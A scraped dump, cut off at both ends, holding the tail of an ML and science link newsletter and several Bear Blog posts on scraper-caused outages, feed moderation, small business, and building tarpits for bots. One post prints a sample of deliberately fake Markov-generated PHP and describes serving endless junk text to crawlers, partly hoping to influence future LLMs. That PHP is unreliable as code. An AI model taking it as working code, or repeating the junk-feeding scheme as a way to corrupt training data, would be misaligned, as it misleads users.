chips\u201d\\n(2.7\u00d7 TPUv3 chips; up to TPUv4-4096 pods, yielding &gt;1 ExaFLOPS; public access later in 2021)x\\n\u201cZeRO-Infinity: Breaking the GPU Memory Wall for Extreme Scale Deep Learning\u201d\\n, Rajbhandari et al 2021 (~1 trillion parameters per 16 GPUs/DGX-2-node, scaling to &gt;512 GPUs ~40% efficiency)\\n\u201cGSPMD: General and Scalable Parallelization for ML Computation Graphs\u201d\\n, Xu et al 2021 (Google upgrade of\\nGPipe\\n/\\nGShard\\narch to match\\nMS DeepSpeed\\n: \u201c\u202650%\u201362% compute utilization on 128\u20132048 Cloud TPUv3 cores for models with up to one trillion parameters\u201d)\\n\u201cDLRM: High-performance, Distributed Training of Large-scale Deep Learning Recommendation Models\u201d\\n,  Mudigere et al 2021 (ZionEX software/hardware platform for training  extremely large embeddings\u2014while embeddings aren\u2019t \u2018real\u2019 parameters  &amp; things like\\nDynamicEmbedding\\nwill never learn tricks like GPT-3 no matter how big, they present similar challenges);\\n\u201cRecPipe: Co-designing Models and Hardware to Jointly Optimize Recommendation Quality and Performance\u201d\\n, Gupta et al 2021\\n\u201cFrom Motor Control to Team Play in Simulated Humanoid Football\u201d\\n,  Liu et al 2021 (curriculum training of a single NN from raw humanoid  control to coordinated team-wide soccer strategy; neat to compare with\\nHill et al 2020\\nin terms of agent abilities)\\n\u201cWav2vec-U: Unsupervised Speech Recognition\u201d\\n, Baevski et al 2021\\n\u201cAnthropic\u201d public-benefit-corp/startup launched\\n(founded by the Amodeis; $124M investment for scaling \u201creliable and steerable AI systems\u201d);\\n\u201cCooperative AI Foundation\u201d (CAIF)\\nlaunched\\n\u201cMLP-Mixer: An all-MLP Architecture for Vision\u201d\\n, Tolstikhin et al 2021 (another\\nFC paper\\nremoving even more inductive biases\u2014ponies are all you need: \u201cMixer\\nimproves more rapidly with data\\nthan ResNets, or even ViT, and the gap between large scale Mixer and  ViT models shrinks until the performance is matched on the entire  dataset\u2026\u201d The Bitter Lesson truly is the single bitterest lesson in ML,  isn\u2019t it? The more people tweet about how MLP-Mixer is overhyped because  is \u2212X% worse than the ultra-hand-optimized baseline or requires Y\u00d7 more  FLOPS, the more they demonstrate\\nprecisely why\\nthis sort of  research is so important! And showing, incidentally, that Transformers  are still under-researched if such a fundamental fact could have been  missed for so long.)\\n\u201cData-Efficient Language-Supervised Zero-Shot Learning with Self-Distillation\u201d\\n, Cheng et al 2021 (\\nCLIP\\n-like performance scaled down to\\nn\\n= 3m using\\nsoft labels\\ngenerated by a\\nConceptual Captions\\n-pretrained model)\\n\u201cSR3: Image Super-Resolution via Iterative Refinement\u201d\\n, Saharia et al 2021;\\n\u201cDiffusion Models Beat GANs on Image Synthesis\u201d\\n, Dhariwal &amp; Nichol 2021 (\\nDDPM\\n^\\n1\\n^ finally surpass\\nBigGAN-deep\\non ImageNet 512px images at similar compute-cost, as\\nexpected from their\\ngood scaling\\n);\\n\u201cCascaded Diffusion Models for High Fidelity Image Generation\u201d\\n, Ho et al 2021\\n\u201cLearning to summarize from human feedback\u201d\\n, Stiennon et al 2020\\n\u201cGrokking: Generalization Beyond Overfitting On Small Algorithmic Data Sets\u201d\\n, Power et al 2021 (\\ndiscussion\\n;  new scaling effect, \u2018grokking\u2019: sudden perfect generalization emerging  many epochs after training-set overfitting on algorithmic tasks when  training in\\nflat shallow loss landscapes\\n);\\n\u201cKnowledge distillation: A good teacher is patient and consistent\u201d\\n, Beyer et al 2021 (training much smaller models merely requires hundreds of thousands or millions of epochs)\\n\u201cScaling End-to-End Models for Large-Scale Multilingual ASR\u201d\\n, Li et al 2021\\n\u201cThe Shape of Learning Curves: a Review\u201d\\n, Viering &amp; Loog 2021\\n\u201cReward is enough\u201d\\n,  Silver et al 2021 (a DRL manifesto: reward losses enough at scale of  compute/parameters/tasks to induce all important capabilities like  memory/exploration/generalization/imitation/reasoning)\\nScaling Down\\n:\\nlazy\\n: a tool for running processes in idle time\\n(how to train on a GPU without destroying your GUI\u2019s usability!\\nlazy\\npauses runs briefly while you interact with your desktop, letting you  do months-long runs without going crazy or resorting to Colab etc. This  enables hobbyists to go after previously-infeasible model sizes);  EleutherAI releases\\na 6b-parameter GPT-3 model, GPT-J\\n(are you still using GPT-2/GPT-Neo? upgrade!);\\n\u201cAggregating Nested Transformers\u201d\\n, Zhang et al 2021/\\n\u201cLess is More: Pay Less Attention in Vision Transformers\u201d\\n, Pan et al 2021\\n\u201cByT5: Towards a token-free future with pre-trained byte-to-byte models\u201d\\n, Xue et al 2021 (character models\u2014not just feasible but desirable; we\u2019ll get our rhyming &amp; pun-making language models yet!)\\n\u201cMachine Learning Attacks Against the Asirra CAPTCHA\u201d\\n,  Golle 2008 (a look back on a decade of CV progress: months of work for  80% cat vs dog with SVM ensembles in 2008; 5min in Fast.ai for 99%  accuracy in 2018; for even more perspective,\\nCire\u015fan 2012\\n)\\n2.2 Genetics\\nEverything Is Heritable:\\n\u201cBi-ancestral  depression GWAS in the Million Veteran Program and meta-analysis in  &gt;1.2 million individuals highlight new therapeutic directions\u201d\\n, Levey et al 2021\\n\u201cThe complete sequence of a human genome\u201d\\n, Nurk et al 2021 (\\nmedia\\n)\\n\u201cUsing DNA to predict intelligence\u201d\\n, von Stumm &amp; Plomin 2021 (review)\\n\u201cLong  read sequencing of 3,622 Icelanders provides insight into the role of  structural variants in human diseases and other traits\u201d\\n, Beyter et al 2021\\n\u201cRapid Sequencing\u2013Based Diagnosis of Thiamine Metabolism Dysfunction Syndrome\u201d\\n(sequence everyone!)\\nEngineering:\\n\u201cSense codon reassignment enables viral resistance and encoded polymer synthesis\u201d\\n,  Robertson et al 2021 (\u201cultra-safe cells\u201d: synthesizing an entire E.  coli genome with swapped codons for complete viral immunity)\\n\u201cIn vivo CRISPR base editing of\\nPCSK9\\ndurably lowers cholesterol in primates\u201d\\n, Musunuru et al 2021\\nOptogenetics\\n:\\n\u201cPartial recovery of visual function in a blind patient after optogenetic therapy\u201d\\n, Sahel et al 2021 (\\nmedia\\n);\\n\u201cWireless multilateral devices for optogenetic studies of individual and social behaviors\u201d\\n, Yang et al 2021 (\\nmedia\\n)\\n\u201cRetron Library Recombineering (RLR): High-throughput functional variant screens via in vivo production of single-stranded DNA\u201d\\n, Schubert et al 2021\\n\u201cFirst genetically modified Oxitec mosquitoes released in the United States\u201d\\n\u201cGenomic characterization of world\u2019s longest selection experiment in mouse reveals the complexity of polygenic traits\u201d\\n, Palma-Vera et al 2021\\n\u201cSurrogate broodstock to enhance biotechnology research and applications in aquaculture\u201d\\n, Jin et al 2021\\n\u201cUtility of polygenic embryo screening for disease depends on the selection strategy\u201d\\n, Lencz et al 2021\\n\u201cLimit  on lab-grown human embryos dropped by stem-cell body: The International  Society for Stem Cell Research relaxed the famous 14-day rule on  culturing human embryos in its latest research guidelines\u201d\\n\u201cUseful Mutants, Bred With Radiation\u201d\\n(on\\natomic gardening\\n)\\n2.3 Statistics/Meta-Science\\n\u201cCorrelated Failures\u201d in HDDs/SSDs\\n\u201cHow a Publicity Blitz Created The Myth of Subliminal Advertising\u201d\\n, Rogers 1992 (the famous movie-theater/popcorn-sales experiment never happened)\\n2.4 Politics/Religion\\n\u201cClarifying the Structure and Nature of Left-Wing Authoritarianism (LWA)\u201d\\n, Costello et al 2021\\n\u201cBook Review:\\nThe Decline and Fall of the Roman Empire\\n\u201d\\n(\\nexcerpts\\n)\\n2.5 Psychology/Biology\\n\u201cA connectomic study of a petascale fragment of human cerebral cortex\u201d\\n,  Shapson-Coe et al 2021 (\u201c\u2026This \u201cdigital tissue\u201d is a ~660,000\u00d7 scale up  of an earlier saturated reconstruction from a small region of mouse  cortex, published in 2015 (\\nKasthuri et al 2015\\n).  Although this scaleup was difficult, it was not hundreds of thousands  of times more difficult and took about the same amount of time as the  previous data set (~4 years)\u2026The rapid improvements over the past few  years\u2026argues that analyzing volumes that are even 3 orders of magnitude  larger, such as an exascale whole mouse brain connectome, will likely be  in reach within a decade.\" See also\\n\u201cAccelerating progress in brain recording tech\u201d\\n.)\\n\u201cNeuroimaging evidence for a network sampling theory of individual differences in human intelligence test performance\u201d\\n, Soreq et al 2021;\\n\u201cThe neural basis of intelligence in fine-grained cortical topographies\u201d\\n, Feilong et al 2021;\\n\u201cPredicting intelligence from brain gray matter volume\u201d\\n, Hilger et al 2020 (towards the mechanistic reification of\\ng\\n: per\\nP-FIT\\n,  it is global efficiency/total cognitive resources which can be spent on  learning &amp; orchestrating specialized capabilities); if we consider  recent human brain imaging studies, cross-species comparisons, and deep  learning as converging, I would offer as a speculation the following:\\nThe Master Synthesis: intelligence  is execution of small simplicity-weighted programs, best discovered by  search over smooth loss landscapes like that of\\nhighly-overparameterized\\ndifferentiable networks containing lottery-ticket subnetworks which are ensembled/averaged over,\\napproaching Bayes-optimal\\nreasoning in the limit (as nearest-neighbors-like high dimensional  interpolation / memorization gives way to algorithmic generalization /  interpolation on a more abstract level); this can be implemented by  large numbers of similar neurons trained using any of the many  approximations to backprop; human intelligence\u2019s\\ng\\nis real but  is the overall \u2018pool\u2019 of neural resources which derives from overall  body integrity because the number of neurons, their density, their  myelination, resistance to damage and infection etc, is causally  downstream of all body and developmental systems, creating a huge  mutational target; the brain regions specialize and differentiate, and  their orchestration (or lack thereof) contributes to observed  performance on tasks tapping into multiple specialized regions; as tasks  rely on fewer regions or approach intrinsic ceiling,\\ng\\nceases to be observable and task-specific influences matter most.\\n\u201cMDMA-assisted therapy for severe PTSD: a randomized, double-blind, placebo-controlled phase 3 study\u201d\\n, Mitchell et al 2021 (\\nd\\n= 0.9 over therapy);\\n\u201cEffects of Psilocybin-Assisted Therapy on Major Depressive Disorder\u201d\\n, Davis et al 2021\\n\u201cWhy  Animals Don\u2019t Get Lost: Birds do it. Bees do it. Learning about the  astounding navigational feats of wild creatures can teach us a lot about  where we\u2019re going\u201d\\n(on spectacular but still mysterious feats of\\nanimal navigation\\n)\\n\u201cIn The Future Of Collecting, Is Anyone Having Fun?\u201d\\n(on\\nBobblehead\\ncollectors)\\n\u201cLinking Brain Biology to Intellectual Endowment: A Review on the Associations of Human Intelligence With Neuroimaging Data\u201d\\n, Dizaji et al 2021\\n\u201cThe Best And The Rest: Revisiting The Norm Of Normality Of Individual Performance\u201d\\n, O\u2019Boyle &amp; Aguinis 2012 (performance is\\nlog-normal\\n)\\n\u201cA conserved strategy for inducing appendage regeneration\u201d\\n, Abrams et al 2021 (slight regrowth of damaged mouse limbs by drinking sugar+amino-acid-supplemented water)\\n\u201cKnow Your Amphetamines\u201d\\n, Scott Alexander\\n\u201cFeeling Small: Exploring the Tactile Perception Limits [of Humans]\u201d\\n, Skedung et al 2013\\n\u201cThe Board Game of the Alpha Nerds: Before\\nRisk\\n, before\\nDungeons &amp; Dragons\\n, before\\nMagic: The Gathering\\n, there was\\nDiplomacy\\n\u201d\\n(\\nWP\\n;  \u201cI still don\u2019t know whom I should have trusted, if anyone. All I know  is that I felt stupid, stressed out, humiliated, and sad.\u201d)\\n2.6 Technology\\n\u201cI walk the (beta-stability) line: How counting neutrons explains nuclear waste\u201d\\n\u201cMaking is Show Business now\u201d\\n, Alex Danco\\n\u201cShop Class as Soulcraft: The case for the manual trades\u201d\\n, Crawford 2006\\n\u201cSpintronics: Build mechanical circuits\u201d\\n, Kickstarter (followup to\\nTuring Tumble\\n)\\n2.7 Economics\\n\u201cRCTs to Scale: Comprehensive Evidence from 2 Nudge Units\u201d\\n, DellaVigna &amp; Linos 2020 (nudge effects overestimated by 6.2\u00d7 due to publication bias)\\n\u201cNo  causal associations between childhood family income and subsequent  psychiatric disorders, substance misuse and violent crime arrests: a  nationwide Finnish study of &gt;650,000 individuals and their siblings\u201d\\n, Sariaslan et al 2021;\\n\u201cParental income and mental disorders in children and adolescents: prospective register-based study\u201d\\n, Kinge et al 2021\\n\u201cEverything You Might Want to Know about Whaling\u201d\\n, Matt Lakeman\\nExploding Nash Equilibrium For Trustless Trade\\n2.8 Fiction\\n\u201cLove Is the Plan the Plan Is Death\u201d\\n,\\nJames Tiptree, Jr.\\n(\\nWP\\n)\\n2.9 Miscellaneous\\n\u201cThe Strange Story of Dagobert, the\\nDuck Tales\\nBandit: In the \u201990s, a frustrated artist in Berlin went on a crime  spree\u2014building bombs, extorting high-end stores, and styling his persona  after Scrooge McDuck. He soon became a German folk hero.\u201d\\n(\\nWP\\n; another reminder for Americans\u2014odd as it may seem, Donald Duck is\\nextremely\\npopular overseas; see also the unknown-in-the-USA character\\nJohn D. Rockerduck\\nor\\nbeloved Scandinavian tradition\\nFrom All of Us to All of You\\nwho 2020 airing set an all-time record of &gt;4.5m viewers)\\nList of atmospheric optical phenomena\\n(How many would you recognize from a distance or plane? How many have you even heard of?)\\nBaron Franz Nopcsa von Fels\u0151-Szilv\u00e1s\\n(noted geologist, paleontologist, anthropologist, homosexual, &amp; skyjacker)\\nKrishnacore\\nWhat is a diffusion model like DDPM? To try to explain it as simply as possible\\nwithout the math\\n:\\nDDPM is a neural net which is trained to fix noise in an image: it  takes a noisy image and \u2018sharpens\u2019 it to produce a new image. You train  it by adding dirt to a normal image, and teaching it to turn the dirty  version into the original. As it gets better, it learns what the images  all tend to look like so it can \u2018see through\u2019 ever more noise, to turn  smudged hints of the original image into its best guess. Once it\u2019s done  training, what happens if you give it a completely dirty photo, which is  pure static noise? Well, it produces a slightly less dirty \u2018photo\u2019. And  if you do it again? it\u2019s a little cleaner still. Now, what if you do  this many times? It has to get cleaner each time. The end result: the  static noise goes in, and a face pops out! The DDPM has hallucinated a  face out of the noise. One little blob of static here turned into a  nose, and another blob turned into an ear, and it went from there.","text":""},{"location":"herman.bearblog.dev/","title":"herman.bearblog.dev\\n\\n\u7f51\u7ad9: https://herman.bearblog.dev\\nRSS: https://herman.bearblog.dev/feed/\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Things that work (for me)_20260205\\n- Discovery and AI_20260205\\n- Grow slowly, stay small_20260205\\n- Messing with bots_20260205\\n- Aggressive bots ruined my weekend_20260205\\n","text":""},{"location":"herman.bearblog.dev/Aggressive%20bots%20ruined%20my%20weekend_20260205/","title":"Aggressive bots ruined my weekend\\n\\n\u6765\u6e90: https://herman.bearblog.dev\\n\u94fe\u63a5: https://herman.bearblog.dev/agressive-bots/\\n\u65e5\u671f: 2025-10-29T09:43:00+00:00\\n\\n---\\n\\nOn the 25th of October Bear had its first major outage. Specifically, the reverse proxy which handles custom domains went down, causing custom domains to time out.\\nUnfortunately my monitoring tool failed to notify me, and it being a Saturday, I didn't notice the outage for longer than is reasonable. I apologise to everyone who was affected by it.\\nFirst, I want to dissect the root cause, exactly what went wrong, and then provide the steps I've taken to mitigate this in the future.\\nI wrote about\\nThe Great Scrape\\nat the beginning of this year. The vast majority of web traffic is now bots, and it is becoming increasingly more hostile to have publicly available resources on the internet.\\nThere are 3 major kinds of bots currently flooding the internet: AI scrapers, malicious scrapers, and unchecked automations/scrapers.\\nThe first has been discussed at length. Data is\\nworth something\\nnow that it is used as fodder to train LLMs, and there is a financial incentive to scrape, so scrape they will. They've depleted all human-created writing on the internet, and are becoming increasingly ravenous for new wells of content. I've seen this compared to the search for\\nlow-background-radiation steel\\n, which is, itself, very interesting.\\nThese scrapers, however, are the easiest to deal with since they tend to identify themselves as ChatGPT, Anthropic, XAI, et cetera. They also tend to specify whether they are from user-initiated searches (think all the sites that get scraped when you make a request with ChatGPT), or data mining (data used to train models). On Bear Blog I allow the first kinds, but block the second, since bloggers want discoverability, but usually don't want their writing used to train the next big model.\\nThe next two kinds of scraper are more insidious. The malicious scrapers are bots that systematically scrape and re-scrape websites, sometimes every few minutes, looking for vulnerabilities such as misconfigured Wordpress instances, or\\n.env\\nand\\n.aws\\nfiles, among other things, accidentally left lying around.\\nIt's more dangerous than ever to self-host, since simple mistakes in configurations will likely be found and exploited. In the last 24 hours I've blocked close to 2 million malicious requests across several hundred blogs.\\nWhat's wild is that these scrapers rotate through thousands of IP addresses during their scrapes, which leads me to suspect that the requests are being tunnelled through apps on mobile devices, since the ASNs tend to be cellular networks. I'm still speculating here, but I think app developers have found another way to monetise their apps by offering them for free, and selling tunnel access to scrapers.\\nNow, on to the unchecked automations. Vibe coding has made web-scraping easier than ever. Any script-kiddie can easily build a functional scraper in a single prompt and have it run all day from their home computer, and if the dramatic rise in scraping is anything to go by, many do. Tens of thousands of new scrapers have cropped up over the past few months, accidentally DDoSing website after website in their wake. The average consumer-grade computer is significantly more powerful than a VPS, so these machines can easily cause a lot of damage without noticing.\\nI've managed to keep all these scrapers at bay using a combination of web application firewall (WAF) rules and rate limiting provided by Cloudflare, as well as some custom code which finds and quarantines bad bots based on their activity.\\nI've played around with serving\\nZip Bombs\\n, which was quite satisfying, but I stopped for fear of accidentally bombing a legitimate user. Another thing I've played around with is Proof of Work validation, making it expensive for bots to scrape, as well as serving endless junk data to keep the bots busy. Both of these are\\ninteresting\\n, but ultimately are just as effective as simply blocking those requests, without the increased complexity.\\nWith that context, here's exactly went wrong on Saturday.\\nPreviously, the bottleneck for page requests was the web-server itself, since it does the heavy lifting. It automatically scales horizontally by up to a factor of 10, if necessary, but bot requests can scale by significantly more than that, so having strong bot detection and mitigation, as well as serving highly-requested endpoints via a CDN is necessary. This is a solved problem, as outlined in my Great Scrape post, but worth restating.\\nOn Saturday morning a few hundred blogs were DDoSed, with tens of thousands of pages requested per minute (from the logs it's hard to say whether they were malicious, or just very aggressive scrapers). The above-mentioned mitigations worked as expected, however the reverse-proxy\u2014which sits up-stream of most of these mitigations\u2014became saturated with requests and decided it needed to take a little nap.\\nThe big blue spike is what toppled the server. It's so big it makes the rest of the graph look flat.\\nThis server had been running with zero downtime for 5 years up until this point.\\nUnfortunately my uptime monitor failed to alert me via the push notifications I'd set up, even though it's the only app I have that not only has notifications enabled (see my\\npost on notifications\\n), but even has critical alerts enabled, so it'll wake me up in the middle of the night if necessary. I still have no idea why this alert didn't come through, and I have ruled out misconfiguration through various tests.\\nThis brings me to how I will prevent this from happening in the future.\\nRedundancy in monitoring. I now have a second monitoring service running alongside my uptime monitor which will give me a phone call, email, and text message in the event of any downtime.\\nMore aggressive rate-limiting and bot mitigation on the reverse proxy. This already reduces the server load by about half.\\nI've bumped up the size of the reverse proxy, which can now handle about 5 times the load. This is overkill, but compute is cheap, and certainly worth the stress-mitigation. I'm already bald. I don't need to go balder.\\nAuto-restart the reverse-proxy if bandwidth usage drops to zero for more than 2 minutes.\\nAdded a status page, available at\\nhttps://status.bearblog.dev\\nfor better visibility and transparency. Hopefully those bars stay solid green forever.\\nThis should be enough to keep everything healthy. If you have any suggestions, or need help with your own bot issues,\\nsend me an email\\n.\\nThe public internet is mostly bots, many of whom are bad netizens. It's the most hostile it's ever been, and it is because of this that I feel it's more important than ever to take good care of the spaces that make the internet worth visiting.\\nThe arms race continues...","text":""},{"location":"herman.bearblog.dev/Discovery%20and%20AI_20260205/","title":"Discovery and AI\\n\\n\u6765\u6e90: https://herman.bearblog.dev\\n\u94fe\u63a5: https://herman.bearblog.dev/discovery-and-ai/\\n\u65e5\u671f: 2025-12-30T12:04:00+00:00\\n\\n---\\n\\nI browse the discovery feed on Bear daily, both as part of my role as a moderator, and because it's a space I love, populated by a diverse group of interesting people.\\nI've read the posts regarding AI-related content on the discovery feed, and I get it. It's such a prevalent topic right now that it feels inescapable, available everywhere from Christmas dinner to overheard conversation on the subway. It's also becoming quite a polarising one, since it has broad impacts on society and the natural environment.\\nThis conversation also raises the question about popular bloggers and how pre-existing audiences should affect discoverability. As with all creative media, once you have a big-enough audience it becomes self-perpetuating that you get more visibility. Think Spotify's 1%. Conveniently, Bear is small enough that bloggers with no audience can still be discovered easily and it's something I'd like to preserve on the platform.\\nIn this post I'll try and explain my thinking on these matters, and clear up a few misconceptions.\\nFirst off, posts that get many upvotes through a large pre-existing audience, or from doing well on Hacker News do not spend disproportionately more time on the discovery feed. Due to how the algorithm works, after a certain number of upvotes, more upvotes have little to no effect. Even a post with 10,000 upvotes won't spend more than a week on page #1. I want Trending to be equally accessible to all bloggers on Bear.\\nWhile this cap solves the problem of sticky posts, there is a second, less pressing issue: If a blogger has a pre-existing audience, say in the form of a newsletter or Twitter account, some of their existing audience will likely upvote, and that post has a good chance of feature on the Trending page.\\nOne of the potential solutions I've considered is either making upvotes available to logged in users only, or Bear account holders receive extra weighting in their upvotes. However, due to how domains work each blog is a new website according to the browser, and so logins don't persist between blogs. This would require logging in to upvote on each site, which isn't feasible.\\nWhile I moderate Bear for spam, AI-generated content, and people breaking the Code of Conduct, I don't moderate by topic. That removes the egalitarian nature of the platform and puts up topic rails like an interest-group forum or subreddit. While I'm not particularly interested in AI as a topic, I don't feel like it's my place to remove it, in the same way that I don't feel particularly strongly about manga.\\nThere is a hide blog feature on the discovery page. If you don't want certain blogs showing up in your feed, add them to the\\nhidden\\ntextarea to never see them again. Similarly to how Bear gives bloggers the ability to create their own tools within the dashboard, I would like to lean into this kind of extensibility for the discovery feed, with hiding blogs being the start. Curation instead of exclusion.\\nThis post is just a stream of consciousness of my thoughts on the matter. I have been contemplating this, and, as with most things, it's a nuanced problem to solve. If you have any thoughts or potential solutions, send me an email. I appreciate your input.\\nEnjoy the last 2 days of 2025!","text":""},{"location":"herman.bearblog.dev/Grow%20slowly%2C%20stay%20small_20260205/","title":"Grow slowly, stay small\\n\\n\u6765\u6e90: https://herman.bearblog.dev\\n\u94fe\u63a5: https://herman.bearblog.dev/grow-slowly-stay-small/\\n\u65e5\u671f: 2025-12-03T10:14:00+00:00\\n\\n---\\n\\nQuick announcement: I'll be visiting Japan in April, 2026 for about a month and will be on Honshu for most of the trip. Please email me recommendations. If you live nearby, let's have coffee?\\nI've always been fascinated by old, multi-generational Japanese businesses. My leisure-watching on YouTube is usually a long video of a Japanese craftsman\u2014sometimes a 10th or 11th generation\u2014making iron tea kettles, or soy sauce, or pottery, or furniture.\\nTheir dedication to craft\u2014and acknowledgment that perfection is unattainable\u2014resonates with me deeply. Improving in their craft is an almost spiritual endeavour, and it inspires me to engage in my crafts with a similar passion and focus.\\nSlow, consistent investment over many years is how beautiful things are made, learnt, or grown. As a society we forget this truth\u2014especially with the rise of social media and the proliferation of instant gratification. Good things take time.\\nDedication to craft in this manner comes with incredible longevity (survivorship bias plays a role, but the density of long-lived businesses in Japan is an outlier). So many of these small businesses have been around for hundreds, and sometimes over a thousand years, passed from generation to generation. Modern companies have a hard time retaining employees for 2 years, let alone a lifetime.\\nThis longevity stems from a counter-intuitive idea of growing slowly (or not at all) and choosing to stay small. In most modern economies if you were to start a bakery, the goal would be to set it up, hire and train a bunch of staff, and expand operations to a second location. Potentially, if you play your cards right, you could create a national (or international) chain or franchise. Corporatise the shit out of it, go public or sell, make bank.\\nWhile this is a potential path to becoming filthy rich, the odds of achieving this become vanishingly small. The organisation becomes brittle due to thinly-spread resources and care, hiring becomes risky, and leverage, whether in the form of loans or investors, imposes unwanted directionality.\\nThere's a well known parable of the fisherman and the businessman that goes something like this:\\nA businessman meets a fisherman who is selling fish at his stall one morning. The businessman enquires of the fisherman what he does after he finishes selling his fish for the day. The fisherman responds that he spends time with his friends and family, cooks good food, and watches the sunset with his wife. Then in the morning he wakes up early, takes his boat out on the ocean, and catches some fish.\\nThe businessman, shocked that the fisherman was wasting so much time encourages him fish for longer in the morning, increasing his yield and maximising the utility of his boat. Then he should sell those extra fish in the afternoon and save up until he has enough money to buy a second fishing boat and potentially employ some other fishermen. Focus on the selling side of the business, set up a permanent store, and possibly, if he does everything correctly, get a loan to expand the operation even further.\\nIn 10 to 20 years he could own an entire fishing fleet, make a lot of money, and finally retire. The fisherman then asks the businessman what he would do with his days once retired, to which the businessman responds: \"Well, you could spend more time with your friends and family, cook good food, watch the sunset with your wife, and wake up early in the morning and go fishing, if you want.\"\\nI love this parable, even if it is a bit of an oversimplification. There is something to be said about affording comforts and financial stability that a fisherman may not have access to. But I think it illustrates the point that when it comes to running a business, bigger is not always better. This is especially true for consultancies or agencies which suffer from bad horizontal scaling economics.\\nThe trick is figuring out what is \"enough\". At what point are we chasing status instead of contentment?\\nA smaller, slower growing company is less risky, less fragile, less stressful, and still a rewarding endeavour.\\nThis is how I run Bear. The project covers its own expenses and compensates me enough to have a decent quality of life. It grows slowly and sustainably. It isn't leveraged and I control its direction and fate. The most important factor, however, is that I don't need it to be something grander. It affords me a life that I love, and provides me with a craft to practise.","text":""},{"location":"herman.bearblog.dev/Messing%20with%20bots_20260205/","title":"Messing with bots\\n\\n\u6765\u6e90: https://herman.bearblog.dev\\n\u94fe\u63a5: https://herman.bearblog.dev/messing-with-bots/\\n\u65e5\u671f: 2025-11-13T08:56:00+00:00\\n\\n---\\n\\nAs outlined in my previous\\ntwo\\nposts\\n: scrapers are, inadvertently, DDoSing public websites. I've received a number of emails from people running small web services and blogs seeking advice on how to protect themselves.\\nThis post isn't about that. This post is about fighting back.\\nWhen I published my last post, there was an interesting write-up doing the rounds about\\na guy who set up a Markov chain babbler\\nto feed the scrapers endless streams of generated data. The idea here is that these crawlers are voracious, and if given a constant supply of junk data, they will continue consuming it forever, while (hopefully) not abusing your actual web server.\\nThis is a pretty neat idea, so I dove down the rabbit hole and learnt about Markov chains, and even picked up Rust in the process. I ended up building my own babbler that could be trained on any text data, and would generate realistic looking content based on that data.\\nNow, the AI scrapers are actually not the worst of the bots. The real enemy, at least to me, are the bots that scrape with malicious intent. I get hundreds of thousands of requests for things like\\n.env\\n,\\n.aws\\n, and all the different\\n.php\\npaths that could potentially signal a misconfigured Wordpress instance.\\nThese people are the real baddies.\\nGenerally I just block these requests with a\\n403\\nresponse. But since they want\\n.php\\nfiles, why don't I give them what they want?\\nI trained my Markov chain on a few hundred\\n.php\\nfiles, and set it to generate. The responses certainly look like php at a glance, but on closer inspection they're obviously fake. I set it up to run on an isolated project of mine, while incrementally increasing the size of the generated php files from 2kb to 10mb just to test the waters.\\nHere's a sample 1kb output:\\n&lt;?php wp_list_bookmarks () directly, use the Settings API. Use this method directly. Instead, use `unzip_file() {","text":"<p>return substr($ delete, then click \u201c %3 $ s object. ' ), ' $ image * * * * matches all IMG elements directly inside a settings error to the given context. * @return array Updated sidebars widgets. * @param string $ name = \"rules\" id = \"wp-signup-generic-error\" &gt; ' . $errmsg_generic . ' </p> ';     }     /*      * Fires at the end of the new user account registration form.      *      * @since 3.0.0      *      * @param WP_Error $errors A WP_Error object containing ' user_name ' or ' user_email ' errors.      /     do_action( ' signup_extra_fields ', $errors ); } <p>/*  * Validates user sign-up name and email.  *  * @since MU (3.0.0)  *  * @return array Contains username, email, and error messages.  *               See wpmu_validate_user_signup() for details.  / function validate_user_form() {     return wpmu_validate_user_signup( $_POST[' user_name '], $_POST[' user_email '] ); }</p> <p>/*  * Shows a form for returning users to sign up for another site.  *  * @since MU (3.0.0)  *  * @param string          $blogname   The new site name  * @param string          $blog_title The new site title.  * @param WP_Error|string $errors     A WP_Error object containing existing errors. Defaults to empty string.  / function signup_another_blog( $blogname = ' ', $blog_title = ' ', $errors = ' ' ) {     $current_user = wp_get_current_user();</p> <pre><code>if ( ! is_wp_error( $errors ) ) {\n    $errors = new WP_Error();\n}\n\n$signup_defaults = array(\n    ' blogname '   =&gt; $blogname,\n    ' blog_title ' =&gt; $blog_title,\n    ' errors '     =&gt; $errors,\n);\n</code></pre> <p>}\\nI had two goals here. The first was to waste as much of the bot's time and resources as possible, so the larger the file I could serve, the better. The second goal was to make it realistic enough that the actual human behind the scrape would take some time away from kicking puppies (or whatever they do for fun) to try figure out if there was an exploit to be had.\\nUnfortunately, an arms race of this kind is a battle of efficiency. If someone can scrape more efficiently than I can serve, then I lose. And while serving a 4kb bogus php file from the babbler was pretty efficient, as soon as I started serving 1mb files from my VPS the responses started hitting the hundreds of milliseconds and my server struggled under even moderate loads.\\nThis led to another idea: What is the most efficient way to serve data? It's as a static site (or something similar).\\nSo down another rabbit hole I went, writing an efficient garbage server. I started by loading the full text of the classic Frankenstein novel into an array in RAM where each paragraph is a node. Then on each request it selects a random index and the subsequent 4 paragraphs to display.\\nEach post would then have a link to 5 other \"posts\" at the bottom that all technically call the same endpoint, so I don't need an index of links. These 5 posts, when followed, quickly saturate most crawlers, since breadth-first crawling explodes quickly, in this case by a factor of 5.\\nYou can see it in action here:\\nhttps://herm.app/babbler/\\nThis is very efficient, and can serve endless posts of spooky content. The reason for choosing this specific novel is fourfold:\\nI was working on this on Halloween.\\nI hope it will make future LLMs sound slightly old-school and spoooooky.\\nIt's in the public domain, so no copyright issues.\\nI find there are many parallels to be drawn between Dr Frankenstein's monster and AI.\\nI made sure to add\\nnoindex,nofollow\\nattributes to all these pages, as well as in the links, since I only want to catch bots that break the rules. I've also added a counter at the bottom of each page that counts the number of requests served. It resets each time I deploy, since the counter is stored in memory, but I'm not connecting this to a database, and it works.\\nWith this running, I did the same for php files, creating a static server that would serve a different (real)\\n.php\\nfile from memory on request. You can see this running here:\\nhttps://herm.app/babbler.php\\n(or any path with\\n.php\\nin it).\\nThere's a counter at the bottom of each of these pages as well.\\nAs Maury said: \"Garbage for the garbage king!\"\\nNow with the fun out of the way, a word of caution. I don't have this running on any project I actually care about;\\nhttps://herm.app\\nis just a playground of mine where I experiment with small ideas. I originally intended to run this on a bunch of my actual projects, but while building this, reading threads, and learning about how scraper bots operate, I came to the conclusion that running this can be risky for your website. The main risk is that despite correctly using\\nrobots.txt\\n,\\nnofollow\\n, and\\nnoindex\\nrules, there's still a chance that Googlebot or other search engines scrapers will scrape the wrong endpoint and determine you're spamming.\\nIf you or your website depend on being indexed by Google, this may not be viable. It pains me to say it, but the gatekeepers of the internet are real, and you have to stay on their good side,\\nor else\\n. This doesn't just affect your search ratings, but could potentially add a warning to your site in 